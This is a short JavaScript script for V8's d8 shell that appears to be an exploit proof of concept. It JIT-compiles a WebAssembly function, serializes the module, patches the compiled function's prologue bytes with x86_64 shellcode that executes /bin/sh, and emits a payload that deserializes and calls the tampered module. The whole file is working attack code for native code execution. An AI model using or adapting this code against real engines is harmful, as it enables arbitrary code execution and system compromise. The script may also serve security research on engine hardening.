// x86_64 Linux /bin/sh
const shellCode = new Uint8Array([0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x1, 0x1, 0x81, 0x34, 0x24, 0x1, 0x1, 0x1, 0x1, 0x31, 0xf6, 0x56, 0x6a, 0x8, 0x5e, 0x48, 0x1, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0xf, 0x5]);
const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,134,128,128,128,0,1,96,1,124,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,148,128,128,128,0,2,6,109,101,109,111,114,121,2,0,7,116,104,101,102,117,110,99,0,0,10,225,128,128,128,0,1,219,128,128,128,0,2,2,124,2,127,65,1,33,4,2,64,32,0,68,0,0,0,0,0,0,0,0,101,32,0,32,0,98,114,13,0,32,0,68,0,0,0,0,0,0,0,192,160,33,1,65,1,33,3,65,1,33,4,3,64,32,3,183,33,2,32,4,183,32,0,162,32,1,163,170,33,4,32,3,65,1,106,33,3,32,2,32,0,99,13,0,11,11,32,4,11]);
const wasmModule = new WebAssembly.Module(wasmCode);
const wasmInstance = new WebAssembly.Instance(wasmModule);
const main = wasmInstance.exports.thefunc;
for (let i = 0; i < 64646; i++) main(123);
let sb = d8.serializer.serialize(wasmModule);
let s = new Uint8Array(sb);
for (let i = 0; i < s.length; i++) {
  if (s[i] == 0x55 && s[i+1] == 0x48 && s[i+2] == 0x89 && s[i+3] == 0xE5) {
    for (let j = 0; j < shellCode.length; j++) {
      s[i+j] = shellCode[j];
    }
    break;
  }
}
let data = [];
for (let i = 0; i < s.length; i++) {
  data.push(s[i]);
}
write(`new WebAssembly.Instance(d8.serializer.deserialize(new Uint8Array([${data}]).buffer)).exports.thefunc();`);